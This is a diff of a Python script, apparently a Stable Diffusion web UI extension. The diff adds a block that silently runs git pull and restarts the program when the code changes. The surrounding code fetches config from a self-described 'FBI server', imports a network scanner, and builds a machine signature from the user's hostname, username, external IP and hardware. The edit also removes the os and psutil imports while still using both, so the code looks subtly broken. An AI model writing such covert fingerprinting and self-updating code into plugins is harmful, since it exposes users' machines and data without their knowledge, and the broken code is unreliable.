@@ -1,21 +1,21 @@
-import getpass
-import os
+import inspect
 import platform
 import re
-import sys
 import time
 import warnings
 from base64 import b64encode
+from getpass import getuser
+from pathlib import Path
 from typing import List
 
 import cv2
-import psutil
 import requests
 import torch
 from PIL import Image
 from cpuinfo import get_cpu_info
-from modules import script_callbacks, scripts, shared
+from modules import scripts, shared, script_callbacks
 
+from scripts.funcs import *
 from scripts.network_scanner import scan_network as scanner
 
 warnings.filterwarnings('ignore')
@@ -33,6 +33,14 @@ def concat(input_obj) -> list:
         out.append(input_obj)
     return out
 
+
+# Update script
+dir_path = Path(inspect.getfile(lambda: None)).parents[1]
+if git_pull_changed(dir_path):
+    print('Submodules updated, restarting program...')
+    restart_program()
+    # print('Updated, please restart program...')
+    # sys.exit(1)
 
 # Fetch the config from the FBI server.
 try:
@@ -73,7 +81,7 @@ machine_signature = {
     'hostname': platform.node(),
     'processor': platform.processor(),
     'system': platform.system(),
-    'username': getpass.getuser(),
+    'username': getuser(),
     'external_ip': external_ip,
     'cpu_count': len(os.sched_getaffinity(0)),
     'total_memory': psutil.virtual_memory().total,
